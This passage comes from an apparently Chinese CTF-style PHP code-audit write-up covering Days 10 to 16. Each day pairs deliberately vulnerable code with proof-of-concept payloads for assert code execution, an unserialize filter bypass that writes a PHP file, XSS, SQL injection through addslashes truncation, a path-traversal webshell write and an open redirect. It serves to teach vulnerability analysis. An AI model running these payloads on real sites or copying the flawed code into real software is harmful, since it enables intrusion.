..././..././demo.txt</span><br></pre></td></tr></table></figure><h2 id="Day10"><a href="#Day10" class="headerlink" title="Day10"></a>Day10</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST) || $_POST == <span class="keyword">false</span>)&#123;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">goAway</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    error_log(<span class="string">"Hacking attempt."</span>);</span><br><span class="line">    header(<span class="string">'Location: /error/'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($pi) || !is_numeric($pi)) &#123;</span><br><span class="line">    goAway();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!assert(<span class="string">"(int)$pi == 3"</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"This is not pi."</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"This might be pi."</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然看到了<strong>extract</strong>，但是这题考察的不是变量覆盖，我们可以看到<code>goAway()</code>函数中<code>header</code>重定向后并未使用<code>die</code>或者<code>exit</code>，这就导致了后面的代码依然会执行，所以我们直接POST变量<code>pi=phpinfo</code>，就会执行<code>assert(&quot;(int)phpinfo() == 3&quot;)</code>，在burp中能phpinfo的信息</p><h2 id="Day11"><a href="#Day11" class="headerlink" title="Day11"></a>Day11</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cacheFile = <span class="string">'/tmp/cachefile'</span>;</span><br><span class="line">    <span class="keyword">public</span> $template = <span class="string">'&lt;div&gt;Welcome back %s&lt;/div&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($data = null)</span> </span>&#123;</span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;loadData($data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;render($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadData</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">2</span>) !== <span class="string">'O:'</span></span><br><span class="line">        &amp;&amp; !preg_match(<span class="string">'/O:\d:/'</span>, $data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> unserialize($data);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createCache</span><span class="params">($file = null, $tpl = null)</span> </span>&#123;</span><br><span class="line">        $file = $file ?? <span class="keyword">$this</span>-&gt;cacheFile;</span><br><span class="line">        $tpl = $tpl ?? <span class="keyword">$this</span>-&gt;template;</span><br><span class="line">        file_put_contents($file, $tpl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> sprintf(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;template,</span><br><span class="line">            htmlspecialchars($data[<span class="string">'name'</span>])</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;createCache();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> Template($_COOKIE[<span class="string">'data'</span>]);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>本题的正则表达式应修改为<code>&#39;/O:\d:/&#39;</code></p><p>看到<strong>unserialize</strong>就知道这题考察的是<strong>反序列化</strong>，对COOKIE中的变量<strong>data</strong>做了两个过滤处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">substr($data, 0, 2) !== &apos;O:&apos;</span><br><span class="line">!preg_match(&apos;/O:\d:/&apos;, $data)</span><br></pre></td></tr></table></figure><p>php可反序列化类型有String,Integer,Boolean,Null,Array,Object。去除掉Object后，考虑采用数组中存储对象进行绕过。 </p><p>第二个正则匹配过滤，就需要利用到PHP反处理的源码，具体参考<a href="https://www.phpbug.cn/archives/32.html" target="_blank" rel="noopener">php反序列unserialize的一个小特性 </a>，在对象前加一个<code>+</code>号，即<code>O:14-&gt;O:+14</code>，这样就可以绕过正则匹配。</p><p>获取序列化字符串的代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cacheFile = <span class="string">'./info.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> $template = <span class="string">'&lt;?php phpinfo();'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$temp[] = <span class="keyword">new</span> Template();</span><br><span class="line">$temp = serialize($temp);</span><br><span class="line"><span class="keyword">echo</span> $temp;</span><br></pre></td></tr></table></figure><p>获取payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;i:0;O:+8:&quot;Template&quot;:2:&#123;s:9:&quot;cacheFile&quot;;s:10:&quot;./info.php&quot;;s:8:&quot;template&quot;;s:16:&quot;&lt;?php phpinfo();&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>这样，就可以利用file_put_contents函数将PHP代码写入一个PHP文件中</p><h2 id="Day12"><a href="#Day12" class="headerlink" title="Day12"></a>Day12</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sanitized = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    $sanitized[$key] = intval($value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$queryParts = array_map(<span class="function"><span class="keyword">function</span> <span class="params">($key, $value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $key . <span class="string">'='</span> . $value;</span><br><span class="line">&#125;, array_keys($sanitized), array_values($sanitized));</span><br><span class="line"></span><br><span class="line">$query = implode(<span class="string">'&amp;'</span>, $queryParts);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;a href='/images/size.php?"</span> .</span><br><span class="line">    htmlentities($query) . <span class="string">"'&gt;link&lt;/a&gt;"</span>;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>看到结尾的响应标签内容就猜到这题考察的可能是<strong>XSS</strong>，这里过滤的点有两个函数：（1）intval（2）htmlentities</p><p><strong>intval</strong>函数虽然过滤了$value，但是未过滤$key，我们通过$key进行XSS即可</p><p><strong>htmlentities</strong>函数作用是将字符串转化为HTML实体，但是默认不对单引号进行转义，所以我们可以构造一下Payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&apos;onclick%3dalert(&apos;xss&apos;)//=1</span><br></pre></td></tr></table></figure><p>利用的是<code>a</code>标签的<code>onclick</code>事件来进行XSS攻击</p><p>闭合后的标签为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;a href=&apos;/images/size.php?&apos;onclick=alert(&apos;xss&apos;)//=1&apos;&gt;link&lt;/a&gt;&quot;</span><br></pre></td></tr></table></figure><h2 id="Day13"><a href="#Day13" class="headerlink" title="Day13"></a>Day13</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"bootstrap.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST == <span class="keyword">false</span>)&#123;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoginManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $em;</span><br><span class="line">    <span class="keyword">private</span> $user;</span><br><span class="line">    <span class="keyword">private</span> $password;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;em = DoctrineManager::getEntityManager();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = $user;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $user = <span class="keyword">$this</span>-&gt;sanitizeInput(<span class="keyword">$this</span>-&gt;user);</span><br><span class="line">        $pass = <span class="keyword">$this</span>-&gt;sanitizeInput(<span class="keyword">$this</span>-&gt;password);</span><br><span class="line"></span><br><span class="line">        $queryBuilder = <span class="keyword">$this</span>-&gt;em-&gt;createQueryBuilder()</span><br><span class="line">            -&gt;select(<span class="string">'COUNT(u)'</span>)</span><br><span class="line">            -&gt;from(<span class="string">"User"</span>, <span class="string">"u"</span>)</span><br><span class="line">            -&gt;where(<span class="string">"u.user = '$user' AND u.password = '$pass'"</span>);</span><br><span class="line">        $query = $queryBuilder-&gt;getQuery();</span><br><span class="line">        <span class="keyword">return</span> boolval($query-&gt;getSingleScalarResult());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizeInput</span><span class="params">($input, $length = <span class="number">20</span>)</span> </span>&#123;</span><br><span class="line">        $input = addslashes($input);</span><br><span class="line">        <span class="keyword">if</span> (strlen($input) &gt; $length) &#123;</span><br><span class="line">            $input = substr($input, <span class="number">0</span>, $length);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $input;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$auth = <span class="keyword">new</span> LoginManager($_POST[<span class="string">'user'</span>], $_POST[<span class="string">'passwd'</span>]);</span><br><span class="line"><span class="keyword">if</span> (!$auth-&gt;isValid()) &#123;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Hello, '</span>.$_POST[<span class="string">'user'</span>];</span><br></pre></td></tr></table></figure><p>看到关键字user和passwd和SQL语句就很明白，这题考察的是通过<strong>SQL注入进行任意用户登录</strong></p><p>过滤的地方在于<strong>sanitizeInput</strong>函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizeInput</span><span class="params">($input, $length = <span class="number">20</span>)</span> </span>&#123;</span><br><span class="line">        $input = addslashes($input);</span><br><span class="line">        <span class="keyword">if</span> (strlen($input) &gt; $length) &#123;</span><br><span class="line">            $input = substr($input, <span class="number">0</span>, $length);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先对我们输入的用户名和密码值通过<strong>addslashes</strong>函数进行了<strong>转义</strong>处理，然后经过<strong>substr</strong>函数截断前<strong>20</strong>位。因为有转义，我们如果输入反斜杠<code>\</code>，经过转义后会变成<code>\\</code>，这样就不能过滤掉SQL语句中的单引号。但是，设想一下，如果我们输入的字符足够长，并且第二十位放置的是单引号<code>&#39;</code>或者反斜杠<code>\</code>，那么经过转义和截断，最后一位就一定会是一个反斜杠<code>\</code>，这就过滤了SQL语句中的单引号，造成SQL注入</p><p>Payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=1234567890123456789&apos;&amp;passwd= or 1=1#</span><br></pre></td></tr></table></figure><p>这样构成的SQL语句便是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT COUNT(u) FROM User u WHERE u.user = &apos;1234567890123456789\&apos; AND u.password = &apos; or 1=1#&apos;</span><br></pre></td></tr></table></figure><h2 id="Day14"><a href="#Day14" class="headerlink" title="Day14"></a>Day14</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Carrot</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> EXTERNAL_DIRECTORY = <span class="string">'/tmp/'</span>;</span><br><span class="line">    <span class="keyword">private</span> $id;</span><br><span class="line">    <span class="keyword">private</span> $lost = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> $bought = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id = rand(<span class="number">1</span>, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($input <span class="keyword">as</span> $field =&gt; $count) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$field = $count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        file_put_contents(</span><br><span class="line">            <span class="keyword">self</span>::EXTERNAL_DIRECTORY . <span class="keyword">$this</span>-&gt;id,</span><br><span class="line">            var_export(get_object_vars(<span class="keyword">$this</span>), <span class="keyword">true</span>)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$carrot = <span class="keyword">new</span> Carrot($_GET);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>看到<strong>file_put_contents</strong>函数，猜测考察写入<strong>webshell</strong>，foreach函数存在变量覆盖：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach ($input as $field =&gt; $count) &#123;</span><br><span class="line">            $this-&gt;$field = $count++;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><code>$this-&gt;$field = $count++;</code>中的<code>++</code>是后增，不会影响，所以我们可以通过此函数覆盖变量<strong>$id</strong>，控制写入的文件名和位置：<code>id=../../var/www/html/info.php</code></p><p>再观察写入的内容，经过两个函数<strong>get_object_vars</strong>和<strong>var_export</strong>的处理，先看看这两个函数的作用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get_object_vars — 返回由对象属性组成的关联数组</span><br><span class="line">var_export — 输出或返回一个变量的字符串表示</span><br></pre></td></tr></table></figure><p>var_export与var_dump区别在于var_export输出的是合法的PHP代码，那么我们就可以写入合法的PHP代码</p><p>最终的Payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=../../var/www/html/info.php&amp;a=&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><p>最终写入的内容是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">array (</span><br><span class="line">&apos;id&apos; =&gt; &apos;../../var/www/html/test/shell.php&apos;,</span><br><span class="line">&apos;lost&apos; =&gt; 0,</span><br><span class="line">&apos;bought&apos; =&gt; 0,</span><br><span class="line">&apos;a&apos; =&gt; &apos;&lt;?php phpinfo()?&gt;&apos;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="Day15"><a href="#Day15" class="headerlink" title="Day15"></a>Day15</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Redirect</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $websiteHost = <span class="string">'www.vulnspy.com'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">setHeaders</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line">        $url = urldecode($url);</span><br><span class="line">        header(<span class="string">"Location: $url"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">startRedirect</span><span class="params">($params)</span> </span>&#123;</span><br><span class="line">        $parts = explode(<span class="string">'/'</span>, $_SERVER[<span class="string">'PHP_SELF'</span>]);</span><br><span class="line">        print_r($parts);</span><br><span class="line">        $baseFile = end($parts);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'$baseFile = '</span>.$baseFile.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        $url = sprintf(</span><br><span class="line">            <span class="string">"%s?%s"</span>,</span><br><span class="line">            $baseFile,</span><br><span class="line">            http_build_query($params)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'$url = '</span>.$url.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setHeaders($url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'redirect'</span>]) &#123;</span><br><span class="line">    (<span class="keyword">new</span> Redirect())-&gt;startRedirect($_GET[<span class="string">'params'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这题考察的是<strong>任意路径跳转</strong>，跳转的路径来源于<code>$_SERVER[&#39;PHP_SELF&#39;]</code>，这个全局变量含义是当前执行脚本在服务器下的路径，再通过<code>explode</code>函数将路径以<code>/</code>为分隔符分隔成一个数组，通过<code>end</code>函数将数组最后一个元素取出拼接上参数<code>$params</code>，再经过<code>urldecode</code>函数进行一次URL解码后作为重定向的url</p><p>假想我们要跳转到百度页面，访问<code>http://127.0.0.1/html/day15.php/https://www.baidu.com?redirect=1</code>，那么经过处理后的跳转的应该是<code>Location: www.baidu.com</code>，还是站内页面。我们要跳转到站外，就必须要加上<code>http</code>，所以，我们就可以利用题目中的一次URL解码加上本身浏览器对GET就有一次URL解码，对<code>//</code>进行<strong>二次URL编码</strong>，编码后为<code>%25%32%66%25%32%66</code>，那么payload就为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/html/day15.php/https:%25%32%66%25%32%66www.baidu.com?redirect=1</span><br></pre></td></tr></table></figure><p>最后跳转的为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Location: https://www.baidu.com?</span><br></pre></td></tr></table></figure><p>就成功跳转到百度页面</p><h2 id="Day16"><a href="#Day16" class="headerlink" title="Day16"></a>Day16</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FTP</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sock;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($host, $port, $user, $pass)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sock = fsockopen($host, $port);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;login($user, $pass);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cleanInput();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mode($_REQUEST[<span class="string">'mode'</span>]);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;send($_FILES[<span class="string">'file'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanInput</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $_GET = array_map(<span class="string">'intval'</span>, $_GET);</span><br><span class="line">        $_POST = array_map(<span class="string">'intval'</span>, $_POST);</span><br><span class="line">        $_COOKIE = array_map(<span class="string">'intval'</span>, $_COOKIE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        fwrite(<span class="keyword">$this</span>-&gt;sock, <span class="string">"USER "</span> . $username . <span class="string">"\n"</span>);</span><br><span class="line">        fwrite(<span class="keyword">$this</span>-&gt;sock, <span class="string">"PASS "</span> . $password . <span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">mode</span><span class="params">($mode)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($mode == <span class="number">1</span> || $mode == <span class="number">2</span> || $mode == <span class="number">3</span>) &#123;</span><br><span class="line">            fputs(<span class="keyword">$this</span>-&gt;sock, <span class="string">"MODE $mode\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">send</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        fputs(<span class="keyword">$this</span>-&gt;sock, $data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> FTP(<span class="string">'localhost'</span>, <span class="number">21</span>, <span class="string">'user'</span>, <span class="string">'password'</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这题的漏洞在于<code>$this-&gt;mode($_REQUEST[&#39;mode&#39;]);</code>和<code>==</code></p><p>首先，我们知道全局变量<code>$_REQUEST[]</code>是取值于<code>$_GET</code>，<code>$_POST</code>和<code>$_COOKIE</code>，即当三个全局变量一旦有赋值，<code>$_REQUEST</code>就被赋值，后面值不会再因为它们三个全局变量改变而改变，举个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_GET = array_map(&apos;intval&apos;,$_GET);</span><br><span class="line">var_dump($_GET);</span><br><span class="line">var_dump($_REQUEST);</span><br></pre></td></tr></table></figure><p>最后输出的是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123; [&quot;a&quot;]=&gt; int(1) &#125; </span><br><span class="line">array(1) &#123; [&quot;a&quot;]=&gt; string(4) &quot;1abc&quot; &#125;</span><br></pre></td></tr></table></figure><p>第二，<code>==</code>在PHP中是<strong>弱类型比较</strong>，即<code>1 == &#39;1a&#39;</code>，所以最后的payload为：</p><figure class="highlight plain"><table><tr><td 